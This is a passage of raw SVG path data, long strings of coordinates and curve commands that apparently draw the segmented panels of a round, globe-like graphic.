62.5536 114.176 62.5577 115.415C62.5661 118.381 62.5118 121.345 62.3535 124.306C62.2742 125.748 62.812 126.245 64.213 126.324C68.5785 126.568 72.9397 126.908 77.0008 127.189V127.193ZM61.5362 119.705C61.6071 119.705 61.6738 119.705 61.7446 119.705C61.7446 118.26 61.6738 116.811 61.7656 115.369C61.8365 114.276 61.532 113.8 60.3646 113.605C52.847 112.333 45.342 111.012 37.8453 109.629C36.657 109.41 36.5236 109.791 36.6528 110.76C37.0906 113.965 37.5326 117.17 37.9037 120.384C38.0371 121.544 38.6251 122.046 39.7258 122.24C46.4845 123.429 53.2348 124.63 59.9852 125.868C61.2485 126.1 61.582 125.603 61.5446 124.46C61.4946 122.878 61.532 121.291 61.532 119.705H61.5362ZM35.5938 101.098C35.6189 101.098 35.648 101.098 35.673 101.098C35.673 99.3084 35.5854 97.511 35.7022 95.726C35.7815 94.4752 35.3644 93.9699 34.147 93.5559C28.3848 91.5927 22.656 89.5261 16.948 87.4181C15.8722 87.0205 15.4094 87.0412 15.4511 88.2919C15.5762 92.1436 15.622 95.9993 15.8514 99.8468C15.889 100.485 16.5602 101.416 17.1564 101.64C22.8519 103.785 28.5933 105.802 34.318 107.877C35.352 108.254 35.6522 107.935 35.6146 106.883C35.548 104.957 35.5979 103.028 35.5979 101.098H35.5938ZM46.6346 46.5951C46.1509 46.3839 45.663 46.1437 45.1585 45.9614C40.8557 44.4042 36.5236 42.9257 32.2624 41.2608C31.1283 40.8177 30.653 41.0538 30.1568 41.9856C28.1721 45.7006 26.2 49.4238 24.1444 53.0973C23.4773 54.2942 23.8485 54.8202 24.995 55.2261C30.0901 57.0276 35.1894 58.825 40.2636 60.6928C41.456 61.1318 41.8147 60.668 42.1566 59.6409C43.4824 55.6443 44.8834 51.6768 46.2551 47.6968C46.3469 47.4358 46.4344 47.175 46.6387 46.5992L46.6346 46.5951ZM135.256 74.1983C134.135 69.68 133.063 65.2734 131.895 60.8916C131.829 60.639 130.95 60.3616 130.561 60.4733C125.854 61.8484 121.164 63.273 116.493 64.7681C116.061 64.909 115.489 65.6669 115.535 66.0768C116.052 70.5166 116.656 74.948 117.319 79.367C117.377 79.7439 118.129 80.3816 118.378 80.3071C123.674 78.7416 128.948 77.1057 134.21 75.4201C134.598 75.2958 134.836 74.7036 135.253 74.1983H135.256ZM92.9031 126.961C92.9114 127.028 92.9239 127.09 92.9323 127.156C98.2359 126.493 103.544 125.863 108.835 125.135C109.485 125.044 110.436 124.584 110.619 124.07C111.845 120.704 112.904 117.274 114.001 113.862C114.251 113.087 114.051 112.748 113.104 112.847C105.853 113.584 98.5986 114.251 91.352 115.021C90.8851 115.071 90.2138 115.738 90.1054 116.219C89.6342 118.302 89.3215 120.422 88.9838 122.534C88.7461 124.004 88.5627 125.487 88.3542 126.961H92.8989H92.9031ZM117.532 88.8179C117.532 88.8179 117.545 88.8179 117.549 88.8179C117.549 90.9549 117.557 93.0878 117.545 95.2249C117.54 95.9372 117.423 96.7779 118.558 96.43C123.979 94.7652 129.395 93.0795 134.781 91.3194C135.198 91.1827 135.665 90.3999 135.661 89.9237C135.616 85.7242 135.456 81.5289 135.352 77.3293C135.327 76.3312 135.09 76.0786 133.989 76.4348C128.989 78.0541 123.961 79.5989 118.908 81.0484C117.72 81.388 117.399 81.8229 117.494 83.0281C117.644 84.9456 117.537 86.8839 117.537 88.8096L117.532 88.8179ZM81.3162 50.397C83.947 50.397 86.1652 50.3515 88.3792 50.4136C89.5842 50.4467 89.9886 50.0243 89.8135 48.8398C89.2549 45.0959 88.7212 41.352 88.2459 37.5956C88.1166 36.5644 87.6954 36.2331 86.6572 36.204C81.9499 36.0715 77.2426 35.8935 72.5395 35.645C71.4304 35.5869 70.8925 35.8644 70.7215 36.9868C70.1712 40.59 69.6042 44.1931 68.9496 47.7838C68.6951 49.1795 69.2122 49.6185 70.5256 49.6889C74.2614 49.8959 77.989 50.1734 81.312 50.3929L81.3162 50.397ZM66.969 49.5729C67.3652 49.0179 67.9739 48.5333 68.0823 47.9536C68.7535 44.2924 69.258 40.5982 69.9418 36.9371C70.1628 35.7526 69.8918 35.4089 68.7077 35.2184C64.3256 34.5143 59.956 33.715 55.5989 32.8784C54.5398 32.6755 53.9228 32.8784 53.4599 33.8806C51.8422 37.3885 50.1786 40.8756 48.4899 44.3545C47.9938 45.3734 47.998 45.9532 49.3281 46.1976C55.0568 47.2577 60.7732 48.3801 66.9649 49.5729H66.969ZM115.827 64.4782C120.897 62.7719 125.745 61.165 130.558 59.4587C130.858 59.351 131.153 58.3778 130.995 57.9926C129.281 53.8635 127.501 49.7592 125.654 45.6881C125.508 45.3692 124.662 45.0834 124.261 45.1994C120.217 46.3756 116.185 47.614 112.179 48.9144C111.82 49.0304 111.349 49.7676 111.428 50.0906C112.516 54.4267 113.68 58.7422 114.868 63.0535C114.981 63.4677 115.368 63.8073 115.822 64.47L115.827 64.4782ZM94.6209 50.3929C99.1698 49.8503 103.715 49.2996 108.263 48.7777C109.456 48.6411 110.04 48.3181 109.439 46.9637C107.821 43.3068 106.345 39.5835 104.678 35.9473C104.44 35.4255 103.419 34.9202 102.801 34.9658C98.6528 35.2763 94.5167 35.7941 90.3681 36.1171C89.1089 36.2124 88.8838 36.6182 89.0756 37.7654C89.5717 40.7598 89.9594 43.7706 90.3848 46.7732C90.7238 49.1753 92.1345 50.3819 94.6167 50.3929H94.6209ZM135.54 94.2765C134.956 93.6925 136.424 91.9613 134.523 92.479C129.182 93.9368 123.903 95.6266 118.632 97.3163C118.091 97.4902 117.445 98.2233 117.352 98.7783C116.724 102.584 116.248 106.415 115.668 110.23C115.502 111.319 115.84 111.646 116.877 111.323C121.835 109.782 126.814 108.304 131.721 106.626C132.492 106.361 133.276 105.256 133.48 104.407C134.29 101.06 134.872 97.66 135.54 94.2765ZM36.9989 120.985C36.5486 117.047 36.1984 113.551 35.7022 110.076C35.6314 109.588 34.9434 108.991 34.4138 108.797C28.7559 106.734 23.0604 104.779 17.4066 102.709C16.235 102.278 16.0432 102.551 16.3017 103.611C17.1481 107.086 17.9778 110.569 18.8743 114.036C18.9993 114.512 19.3996 115.125 19.8207 115.282C25.2577 117.333 30.7197 119.321 36.19 121.279C36.461 121.375 36.8906 121.027 36.9948 120.985H36.9989ZM75.5165 137.518C77.8764 137.518 80.2363 137.476 82.592 137.539C83.7136 137.568 84.4225 137.274 84.7309 136.11C85.3147 133.915 85.9442 131.728 86.6364 129.562C87.0075 128.39 86.749 128.03 85.4648 127.989C78.3266 127.753 71.1886 127.487 64.0545 127.085C62.5202 126.998 62.2867 127.512 62.3701 128.788C62.5077 130.85 62.5994 132.917 62.6036 134.984C62.6036 136.201 63.0706 136.677 64.3006 136.748C68.0406 136.955 71.7722 137.258 75.5165 137.522V137.518ZM46.768 45.4852C46.9931 45.1828 47.3975 44.7894 47.6228 44.3173C49.3238 40.7721 50.9583 37.198 52.6886 33.6695C53.1681 32.6921 53.1097 32.3069 51.984 31.9342C48.6318 30.8242 45.3462 29.5279 41.994 28.418C41.456 28.2399 40.447 28.4305 40.1219 28.8239C37.4492 32.075 34.8975 35.4296 32.2749 38.7262C31.4744 39.7327 31.7454 40.2752 32.867 40.6727C37.1741 42.1927 41.4769 43.7333 45.784 45.2657C45.98 45.3361 46.1884 45.3568 46.7638 45.4852H46.768ZM61.6988 131.695C61.6029 130.187 62.0657 128.163 61.2652 127.313C60.398 126.394 58.3507 126.572 56.8164 126.27C56.6121 126.229 56.4077 126.203 56.2035 126.162C50.8999 125.168 45.5797 124.241 40.2969 123.147C38.5791 122.791 38.379 123.247 38.8794 124.7C39.6423 126.911 40.3637 129.136 41.0475 131.368C41.3894 132.49 42.0857 133.024 43.2406 133.236C47.8687 134.077 52.4718 135.079 57.1166 135.837C61.8489 136.607 61.8656 136.512 61.6988 131.69V131.695ZM12.078 47.3199C11.782 47.792 11.486 48.1482 11.315 48.554C9.76397 52.24 8.27131 55.9466 6.68691 59.6202C6.15739 60.8461 6.43257 61.7945 7.41239 62.54C10.2685 64.7059 13.1704 66.8223 16.0473 68.9593C17.1606 69.7835 17.4691 69.2534 17.8235 68.1517C19.1119 64.1511 20.4544 60.1585 21.9305 56.2242C22.3641 55.0686 21.968 54.7415 21.1133 54.1493C18.3406 52.2193 15.6596 50.1527 12.9494 48.1316C12.6784 47.9287 12.4533 47.6719 12.078 47.3199ZM111.474 48.5417C115.789 47.1004 119.922 45.7337 124.024 44.2924C124.233 44.2179 124.421 43.3109 124.236 43.0334C121.781 39.2853 119.283 35.5662 116.714 31.8968C116.485 31.5656 115.635 31.3999 115.185 31.5324C112.195 32.3897 109.239 33.3754 106.258 34.2576C105.445 34.4978 105.086 34.6717 105.503 35.6325C107.184 39.48 108.764 43.373 110.415 47.237C110.594 47.6553 111.003 47.9784 111.474 48.5458V48.5417ZM16.8479 70.7484C16.7436 70.649 16.3017 70.1562 15.7805 69.7669C12.8411 67.5926 9.83903 65.4928 6.94958 63.2482C6.1282 62.6062 5.76546 62.2998 5.54865 63.5546C4.85234 67.5595 4.11435 71.5602 3.5056 75.5775C3.40971 76.2153 3.69741 77.2092 4.17273 77.5903C7.29148 80.0876 10.502 82.4732 13.7041 84.8669C14.4296 85.4095 14.7464 85.0989 14.8673 84.2416C15.4719 79.9385 16.1224 75.6437 16.8479 70.7402V70.7484ZM30.111 40.4409C29.7649 40.1882 29.4397 39.9604 29.1228 39.7202C26.7503 37.9434 24.3279 36.2331 22.0388 34.3569C21.2467 33.7067 20.9173 33.8765 20.4544 34.5475C17.9944 38.1257 15.547 41.7164 13.062 45.274C12.4365 46.1686 12.6993 46.8477 13.429 47.4068C16.0557 49.4155 18.7158 51.3786 21.3509 53.3748C22.4099 54.1741 22.9061 53.8511 23.4857 52.708C25.3869 48.96 27.43 45.2864 29.423 41.5839C29.619 41.2194 29.8441 40.8756 30.1068 40.4366L30.111 40.4409ZM89.038 137.323C91.4604 137.112 93.8829 136.938 96.3012 136.685C104.965 135.783 105.157 135.637 108.997 127.84C109.06 127.715 109.135 127.595 109.176 127.466C109.322 127.02 109.456 126.568 109.593 126.121C109.118 126.116 108.639 126.067 108.167 126.116C102.785 126.663 97.4062 127.292 92.015 127.756C87.954 128.109 87.9498 128.014 86.8365 132.018C86.6697 132.615 86.503 133.214 86.3237 133.808C85.5871 136.234 86.4919 137.406 89.038 137.323ZM112.087 125.094C117.395 123.214 122.285 121.49 127.16 119.734C127.439 119.635 127.698 119.278 127.827 118.985C129.344 115.514 130.841 112.031 132.313 108.544C132.43 108.267 132.337 107.906 132.342 107.583C132.021 107.649 131.692 107.695 131.379 107.786C126.405 109.273 121.426 110.743 116.469 112.288C115.911 112.462 115.213 112.963 115.039 113.472C113.875 116.86 112.833 120.289 111.782 123.714C111.703 123.967 111.899 124.303 112.087 125.102V125.094ZM80.9159 35.4296C82.9548 35.4296 84.6892 35.3923 86.4238 35.442C87.5786 35.4752 87.8747 35.003 87.6329 33.9428C86.9199 30.7828 86.3028 27.6021 85.5023 24.467C85.3772 23.97 84.5267 23.357 83.9679 23.3157C80.9284 23.0796 77.8722 23.0422 74.8284 22.8518C73.8612 22.7897 73.4525 23.1085 73.2775 24.0197C72.6937 27.0637 72.0933 30.1077 71.4429 33.1393C71.1635 34.4315 71.6388 34.8539 72.9105 34.9077C75.6791 35.0278 78.4475 35.2639 80.9118 35.4296H80.9159ZM69.404 34.7379C69.7751 34.3073 70.4172 33.8931 70.5381 33.3629C71.2552 30.1989 71.8222 27.0057 72.5019 23.8375C72.7021 22.9098 72.3851 22.6281 71.5138 22.4874C68.6368 22.0194 65.7808 21.4313 62.8996 21.0088C62.3576 20.9301 61.4778 21.2076 61.1985 21.6217C59.1346 24.6451 57.2 27.7512 55.1903 30.8118C54.5733 31.7519 55.0652 31.9797 55.8866 32.1371C60.2478 32.9695 64.6049 33.8144 69.404 34.7379ZM92.0734 35.2722C92.0775 35.3177 92.0859 35.3633 92.0901 35.4048C95.5215 34.9865 98.953 34.5475 102.389 34.1623C103.46 34.0422 103.698 33.6611 103.118 32.7293C101.159 29.5734 99.2741 26.3679 97.2268 23.2701C96.8891 22.7566 95.8592 22.4252 95.1754 22.4625C92.6238 22.6032 90.0846 23.0009 87.5328 23.1541C86.3362 23.2245 86.1944 23.6469 86.4405 24.674C87.0659 27.2791 87.587 29.9089 88.1791 32.5223C88.9046 35.7237 88.0831 35.3674 91.6606 35.2888C91.7982 35.2888 91.9357 35.2763 92.0734 35.2722ZM14.5213 93.3529C14.5672 93.3529 14.6089 93.3529 14.6547 93.3529C14.6547 91.4892 14.5881 89.6255 14.6798 87.766C14.7339 86.7182 14.3212 86.2253 13.4706 85.6496C10.4353 83.6079 7.49995 81.4212 4.52296 79.2882C4.19774 79.0564 3.86835 78.8244 3.53896 78.5925C3.42222 79.0398 3.18456 79.4913 3.20958 79.9303C3.41805 83.7155 3.6432 87.4968 3.93923 91.2779C3.9851 91.8454 4.28113 92.5619 4.70642 92.9056C7.71677 95.3118 10.7855 97.6559 13.8583 99.9834C14.5922 100.538 14.9633 100.298 14.8924 99.3415C14.7382 97.3453 14.6381 95.3491 14.5172 93.3529H14.5213ZM33.0962 22.301C32.7294 22.5453 32.3541 22.7276 32.0664 23.0009C28.9102 25.9911 25.7705 29.0061 22.6142 31.9921C21.8846 32.6796 21.9388 33.3216 22.681 33.8765C24.9909 35.6159 27.3007 37.3596 29.6899 38.9913C30.0109 39.2108 31.0157 38.9789 31.2992 38.631C34.0302 35.2514 36.6528 31.7892 39.363 28.389C39.9593 27.6435 39.8467 27.3619 39.0836 26.8359C37.2658 25.5893 35.5521 24.1978 33.7968 22.8601C33.5841 22.6985 33.384 22.5246 33.1005 22.2968L33.0962 22.301ZM144.566 66.3708C143.362 62.3287 142.086 58.0382 140.765 53.7641C140.74 53.6772 140.022 53.6316 139.813 53.793C137.662 55.5035 135.515 57.2264 133.452 59.0363C133.051 59.3883 132.721 60.1918 132.825 60.6887C133.714 64.9379 134.689 69.1665 135.72 73.3866C135.799 73.7055 136.637 74.1818 136.841 74.0741C139.61 72.5749 142.124 70.7527 143.846 68.0482C144.096 67.6548 144.225 67.1827 144.571 66.3751L144.566 66.3708ZM139.935 51.7347C139.872 51.4986 139.859 51.3495 139.797 51.2337C137.654 47.2247 135.515 43.2156 133.326 39.2315C133.259 39.1114 132.55 39.1569 132.317 39.3434C130.49 40.8011 128.686 42.2838 126.943 43.8368C126.613 44.1309 126.321 44.8805 126.467 45.2325C128.189 49.3658 129.982 53.47 131.826 57.5495C131.984 57.8973 132.888 58.3197 133.035 58.2039C135.219 56.4437 137.346 54.609 139.452 52.7495C139.731 52.5051 139.801 52.0288 139.939 51.7347H139.935ZM20.0959 116.429C20.1293 116.914 20.0543 117.287 20.1918 117.552C21.6761 120.426 23.1605 123.301 24.7241 126.134C24.9992 126.634 25.5579 127.11 26.0958 127.313C30.4237 128.965 34.7766 130.56 39.1296 132.138C39.4756 132.263 39.9133 132.143 40.3095 132.138C40.2136 131.749 40.1343 131.352 40.0177 130.966C39.3088 128.663 38.4999 126.39 37.9078 124.058C37.6118 122.899 37.0615 122.418 35.9273 122.041C31.0657 120.435 26.2584 118.683 21.4301 116.976C21.1049 116.86 20.788 116.711 20.0959 116.425V116.429ZM52.4843 17.5921C52.4593 17.6045 52.1758 17.6666 51.9881 17.8365C48.7276 20.7147 45.4712 23.5973 42.2358 26.4964C41.4227 27.2252 42.1065 27.5566 42.7069 27.7719C46.0258 28.9689 49.3406 30.1658 52.6886 31.2715C53.1056 31.4081 53.9603 31.1473 54.1938 30.7952C56.2577 27.7015 58.2423 24.5498 60.2062 21.3857C60.3646 21.1289 60.277 20.3794 60.1269 20.3254C57.6712 19.3977 55.1861 18.5404 52.4885 17.5921H52.4843ZM136.695 84.1878C136.65 84.1878 136.607 84.1919 136.561 84.196C136.561 85.8484 136.604 87.505 136.545 89.1575C136.511 90.197 136.916 90.4994 137.704 89.8533C139.93 88.0269 142.157 86.1839 144.246 84.2042C144.825 83.6576 145.188 82.5974 145.18 81.7773C145.147 77.8553 144.955 73.9332 144.797 70.0113C144.784 69.7131 144.571 69.419 144.454 69.125C144.2 69.3197 143.938 69.5102 143.687 69.7131C141.535 71.4277 139.442 73.2252 137.204 74.8196C136.348 75.4284 136.007 75.9461 136.115 76.9773C136.374 79.3753 136.508 81.7814 136.695 84.1878ZM104.436 34.1582C108.459 32.837 111.545 31.8471 114.601 30.7621C114.784 30.6958 114.918 29.6687 114.705 29.4451C111.741 26.372 108.73 23.3405 105.666 20.3669C105.328 20.0397 104.528 19.932 104.036 20.0605C102.234 20.5284 100.483 21.1869 98.6861 21.6839C97.7355 21.9448 97.6438 22.2679 98.1525 23.0837C100.158 26.2934 102.118 29.5321 104.048 32.7832C104.323 33.2512 104.357 33.86 104.44 34.1582H104.436ZM132.284 37.7198C131.984 37.2477 131.745 36.7549 131.4 36.349C128.907 33.4085 126.347 30.5219 123.908 27.5358C122.782 26.1609 122.077 26.2064 121.002 27.6186C120.276 28.5712 119.163 29.2835 118.111 29.9255C117.19 30.4888 117.044 30.8574 117.703 31.8016C120.146 35.297 122.514 38.8463 124.837 42.4247C125.387 43.2736 125.842 43.7002 126.734 42.9631C128.318 41.6502 129.916 40.3497 131.463 38.9954C131.808 38.6931 131.984 38.2003 132.284 37.7239V37.7198ZM73.1065 144.633C74.0363 144.633 75.1454 144.625 76.2544 144.633C81.2161 144.679 81.1702 144.663 83.1966 140.032C83.8053 138.636 83.5677 138.321 82.0458 138.293C77.1883 138.209 72.3351 138.011 67.4818 137.796C61.9948 137.551 62.6036 136.118 63.329 142.447C63.4542 143.552 63.9587 143.992 65.0261 144.058C67.657 144.219 70.2879 144.426 73.1023 144.629L73.1065 144.633ZM126.4 121.506C125.95 121.506 125.613 121.432 125.321 121.519C120.876 122.812 116.435 124.1 112.012 125.463C111.441 125.64 110.832 126.137 110.523 126.651C109.089 129.077 107.746 131.559 106.387 134.031C106.233 134.313 106.162 134.64 106.054 134.946C106.387 134.946 106.742 135.033 107.046 134.938C110.798 133.754 114.551 132.565 118.283 131.318C118.841 131.132 119.409 130.717 119.775 130.258C121.827 127.669 123.816 125.031 125.826 122.405C125.992 122.19 126.126 121.946 126.405 121.506H126.4ZM42.857 134.279C42.8445 134.395 42.6611 134.814 42.7986 135.033C43.8952 136.781 45.0084 138.524 46.2135 140.198C46.5428 140.653 47.1765 141.051 47.7353 141.159C52.2883 142.037 56.854 142.86 61.4278 143.618C61.7489 143.672 62.5119 143.055 62.4993 142.778C62.4327 141.27 62.2617 139.755 61.949 138.276C61.8573 137.842 61.236 137.274 60.7815 137.199C54.9818 136.209 49.1654 135.294 42.857 134.279ZM4.57716 95.3574C5.11919 97.2956 5.81549 99.3292 6.24078 101.416C7.45826 107.401 11.6319 110.838 16.6227 113.613C16.948 113.791 17.3524 113.824 17.7235 113.924C17.6901 113.597 17.686 113.261 17.6151 112.942C16.8604 109.579 16.1224 106.216 15.3052 102.87C15.1592 102.274 14.784 101.594 14.3003 101.243C11.3442 99.0848 8.32968 97.0058 5.33184 94.9101C5.14004 94.7734 4.88987 94.7196 4.66471 94.6284C4.64387 94.8231 4.61885 95.0177 4.57716 95.3656V95.3574ZM51.3627 17.1199C51.2376 16.9046 51.2001 16.7597 51.1084 16.6851C49.795 15.6786 48.4983 14.6474 47.1307 13.7156C46.9097 13.5624 46.3219 13.7653 46.0008 13.9599C42.2275 16.2667 38.4749 18.6108 34.7141 20.9384C33.9052 21.4395 33.8926 21.9862 34.6265 22.5287C36.3401 23.8002 38.033 25.1131 39.83 26.2603C40.1927 26.4921 41.1433 26.2685 41.5353 25.9248C44.6123 23.2535 47.6185 20.5036 50.6456 17.7743C50.8916 17.5548 51.1292 17.327 51.3543 17.1158L51.3627 17.1199ZM86.2444 144.443C89.0631 144.095 92.0317 143.818 94.9628 143.324C96.0636 143.139 97.2268 142.632 98.1025 141.95C99.5617 140.811 100.838 139.427 102.147 138.106C102.501 137.745 102.697 137.232 102.968 136.785C102.426 136.797 101.884 136.772 101.346 136.823C96.8016 137.253 92.261 137.866 87.7038 138.073C85.5148 138.173 84.2389 138.769 83.651 140.898C83.3134 142.119 82.6796 143.262 82.1751 144.443H86.2403H86.2444ZM144.963 86.9418C144.779 86.3165 144.675 85.9644 144.571 85.6124C144.309 85.8112 144.05 86.0141 143.788 86.2129C141.761 87.7494 139.722 89.2693 137.72 90.8348C137.22 91.2282 136.557 91.7253 136.457 92.2678C135.711 96.2479 135.085 100.253 134.427 104.249C134.323 104.875 134.302 105.475 135.207 104.924C138.187 103.114 141.215 101.193 142.332 97.7387C143.491 94.1605 144.137 90.4165 144.963 86.9459V86.9418ZM109.41 16.2502C108.555 17.0123 107.817 17.8488 106.912 18.4287C105.883 19.0872 106.029 19.4847 106.817 20.2344C109.268 22.5702 111.707 24.9225 114.03 27.3826C116.76 30.2775 116.969 30.3397 119.938 27.5607C120.238 27.2791 120.501 26.9519 120.797 26.6619C121.622 25.8585 121.56 25.1669 120.621 24.4711C117.182 21.9158 113.763 19.3356 110.331 16.772C110.06 16.5691 109.739 16.4365 109.41 16.2502ZM80.1945 22.4418C81.4079 22.4418 82.517 22.4045 83.6261 22.4542C84.6976 22.4997 84.9769 22.0856 84.6476 21.0999C83.9762 19.0747 83.3884 17.0205 82.6671 15.016C82.4335 14.3658 81.9457 13.376 81.4704 13.3098C79.711 13.0737 77.9055 13.1357 76.1168 13.1648C75.9667 13.1648 75.7749 13.7322 75.6915 14.0552C75.1245 16.2544 74.5949 18.4618 74.0154 20.6609C73.7528 21.659 74.1113 22.0318 75.112 22.0814C76.8423 22.1642 78.5685 22.3258 80.1945 22.4459V22.4418ZM72.0058 21.8702C72.3393 21.4851 72.9731 21.0461 73.1774 20.4621C73.6527 19.1037 73.9154 17.6708 74.2739 16.271C75.1037 13.0488 75.112 13.0115 71.7681 12.3655C70.8967 12.1956 69.5916 11.9969 69.1163 12.4566C66.9898 14.5149 65.0845 16.8051 63.1081 19.0126C62.5118 19.6794 62.6995 20.1143 63.5459 20.2757C66.1977 20.7852 68.8536 21.278 72.0099 21.8702H72.0058ZM87.6413 22.4211C89.9052 22.1685 92.1692 21.8785 94.4374 21.6756C95.8051 21.5555 95.7591 21.0585 95.0003 20.1888C93.6453 18.6316 92.1734 17.1489 91.0018 15.4675C89.2798 12.995 87.0825 12.3985 84.2515 13.0115C83.2215 13.2352 83.0089 13.4546 83.3675 14.4445C84.1347 16.5732 84.8727 18.7227 85.4231 20.9177C85.7524 22.2389 86.4321 22.5868 87.6413 22.4169V22.4211ZM19.8082 27.7222C20.1043 28.9274 20.2794 29.7971 20.5337 30.6461C20.9131 31.9093 21.3634 32.1371 22.4308 31.0272C24.8699 28.4884 27.3549 25.9703 30.0401 23.7008C31.687 22.3051 33.0296 21.1496 31.5827 18.909C31.4785 18.7476 31.4618 18.5073 31.4744 18.3044C31.5578 16.9252 31.0866 16.71 30.0318 17.5921C27.1131 20.0273 24.1236 22.3796 21.3051 24.9225C20.5212 25.6307 20.2377 26.8814 19.8082 27.7222ZM10.231 40.8136C10.5812 42.0187 10.8564 43.1452 11.2441 44.2345C11.5985 45.2284 11.9863 45.3775 12.6701 44.3297C14.6547 41.2733 16.6269 38.192 18.8535 35.3136C20.0876 33.7192 20.9965 32.4104 19.6164 30.4929C19.2871 30.0332 19.3412 29.3042 19.2078 28.7038C19.137 28.3849 19.041 28.0701 18.9535 27.7512C18.6408 27.9541 18.2363 28.0908 18.0279 28.3724C15.768 31.404 13.4706 34.4149 11.34 37.5335C10.7146 38.4487 10.5895 39.6953 10.2268 40.8136H10.231ZM64.5966 10.158C64.3839 10.2409 64.1088 10.3071 63.8753 10.4479C60.6565 12.3572 57.4459 14.2706 54.2355 16.1922C53.3057 16.7513 53.7351 17.1324 54.4523 17.3891C56.4077 18.0973 58.3591 18.8345 60.3479 19.4268C60.8149 19.5675 61.6363 19.3646 61.9615 19.0126C63.992 16.8383 65.9391 14.5895 67.8738 12.3324C68.0447 12.1294 68.0489 11.4502 67.953 11.4088C66.8731 10.9532 65.7557 10.5763 64.5925 10.1622L64.5966 10.158ZM97.2894 21.3069C99.2741 20.7024 101.059 20.1556 102.843 19.609C103.877 19.2942 104.09 18.8718 103.081 18.1884C100.279 16.2874 97.452 14.4197 94.7168 12.4276C93.3283 11.417 92.0734 11.4005 90.5182 12.0217C89.4341 12.4566 89.3883 12.6429 90.1387 13.463C92.1859 15.7035 94.1414 18.0269 96.1511 20.3006C96.4846 20.6775 96.9099 20.9798 97.2852 21.3069H97.2894ZM32.0206 17.3394C32.3875 18.5529 32.5543 19.3687 32.9003 20.0977C33.0088 20.3297 33.7259 20.5533 33.9426 20.4207C37.8996 18.0269 41.8396 15.6041 45.7381 13.1275C47.1099 12.2536 45.488 11.1603 45.8007 10.1746C45.3003 10.1207 44.6999 9.86397 44.3164 10.0504C40.7598 11.7359 37.2074 13.4298 33.7384 15.2811C32.9628 15.6952 32.5167 16.7182 32.0164 17.3435L32.0206 17.3394ZM3.85167 55.4497C4.19356 56.5969 4.51879 57.7855 4.91488 58.9534C5.00661 59.2226 5.34017 59.4131 5.56115 59.6368C5.73628 59.3676 5.95726 59.115 6.07399 58.8209C7.24979 55.9466 8.26714 53.0021 9.61388 50.2148C10.7104 47.9452 11.9404 45.8497 10.0517 43.4393C9.81818 43.1411 9.84736 42.6483 9.71811 42.2548C9.62638 41.969 9.47628 41.704 9.35119 41.4265C9.14273 41.6791 8.85919 41.8986 8.74246 42.1844C7.38321 45.5017 6.0198 48.815 4.72309 52.1571C4.327 53.176 4.15187 54.2776 3.8475 55.4497H3.85167ZM140.798 102.622C140.727 102.39 140.672 102.228 140.623 102.062C140.451 102.162 140.272 102.249 140.114 102.361C138.246 103.661 136.378 104.962 134.527 106.283C134.202 106.515 133.818 106.788 133.676 107.132C132.246 110.635 130.861 114.16 129.474 117.68C129.403 117.858 129.411 118.066 129.385 118.26C129.619 118.231 129.886 118.26 130.082 118.156C130.512 117.933 130.899 117.643 131.308 117.387C134.577 115.328 136.198 112.015 137.883 108.772C138.929 106.755 139.831 104.668 140.798 102.617V102.622ZM61.4528 7.9713C60.6147 8.20323 60.1353 8.29849 59.6808 8.46414C56.3703 9.68175 53.0472 10.8662 49.7699 12.1626C47.7186 12.9743 47.7311 13.2352 49.4698 14.5853C52.0798 16.6105 52.0465 16.565 54.7859 14.8007C57.1083 13.3055 59.5182 11.9472 61.8781 10.5018C62.3701 10.1994 62.7954 9.78943 63.254 9.42498C62.591 8.89073 61.9282 8.35233 61.4486 7.96302L61.4528 7.9713ZM117.061 133.157C116.211 133.268 115.906 133.277 115.622 133.355C112.42 134.226 109.214 135.079 106.033 136.014C105.349 136.218 104.653 136.631 104.144 137.133C102.718 138.533 101.384 140.019 100.025 141.485C99.7994 141.73 99.6201 142.015 99.4199 142.285C99.7369 142.268 100.066 142.294 100.375 142.235C106.471 141.047 111.582 138.014 116.097 133.885C116.248 133.745 116.427 133.637 117.065 133.165L117.061 133.157ZM95.2755 9.47882C94.8669 9.8267 94.4166 10.2077 93.9621 10.5929C94.254 10.9159 94.4958 11.3052 94.8461 11.5454C97.6272 13.4589 100.467 15.2977 103.218 17.2525C105.249 18.6979 105.699 18.702 107.517 16.9336C108.363 16.1135 108.497 15.5213 107.279 14.9622C103.648 13.2807 100.037 11.5661 96.4138 9.87226C96.1053 9.7273 95.7675 9.64448 95.2755 9.47467V9.47882ZM109.548 14.254C109.856 14.7965 110.035 15.5047 110.494 15.8527C113.996 18.5322 117.553 21.1455 121.106 23.7629C121.347 23.941 121.693 23.9741 121.99 24.0777C122.069 23.7547 122.31 23.357 122.202 23.121C121.564 21.7336 121.18 19.9652 120.088 19.1037C117.341 16.9377 114.259 15.1858 111.307 13.2807C110.302 12.6305 109.431 12.295 109.552 14.2581L109.548 14.254ZM133.139 34.9243C132.909 34.0381 132.931 33.0606 132.459 32.4767C129.606 28.944 126.651 25.4982 123.707 22.04C123.603 21.92 123.194 21.8744 123.085 21.9697C122.782 22.243 123.182 25.6432 123.502 26.0077C126.242 29.1221 128.973 32.2406 131.717 35.3551C131.979 35.6532 132.301 35.9058 132.596 36.1792C132.779 35.7568 132.964 35.3385 133.142 34.9243H133.139ZM71.6555 145.465C71.6555 145.424 71.6555 145.383 71.6555 145.342C69.7167 145.213 67.778 145.047 65.8391 144.973C65.2262 144.948 64.6008 145.16 63.9836 145.263C64.3339 146.062 64.6133 146.902 65.0719 147.636C65.222 147.876 65.8391 147.88 66.2477 147.901C69.2956 148.05 72.3518 148.344 75.3913 148.224C76.6256 148.174 77.843 147.25 79.0188 146.633C79.2856 146.492 79.3482 145.979 79.5025 145.636C79.1773 145.577 78.852 145.474 78.5227 145.474C76.2336 145.462 73.9446 145.465 71.6555 145.465ZM0.908032 70.2763C1.25827 71.6845 1.52928 72.8855 1.87534 74.0617C1.95457 74.3268 2.30063 74.5172 2.52162 74.7408C2.60083 74.48 2.70091 74.2232 2.75093 73.9582C3.32632 70.7774 3.58483 67.5016 4.55631 64.4451C5.31932 62.0554 4.75644 60.2 3.70574 58.2411C3.589 58.0216 3.38052 57.8518 3.21374 57.6612C3.11785 57.9139 2.97608 58.1583 2.93022 58.4234C2.23809 62.4158 1.56263 66.4123 0.903863 70.2763H0.908032ZM46.6136 9.96337C46.8389 11.5579 46.9556 12.469 48.5983 11.8022C52.3217 10.2947 56.1201 8.97769 59.8684 7.5323C60.2646 7.37907 60.523 6.88209 60.8441 6.54248C60.4147 6.33126 59.931 5.86741 59.5683 5.95024C55.6489 6.83653 51.7379 7.76423 47.8562 8.79547C47.2933 8.94456 46.8889 9.69003 46.6136 9.96337ZM62.2659 147.47C63.2082 147.619 63.7502 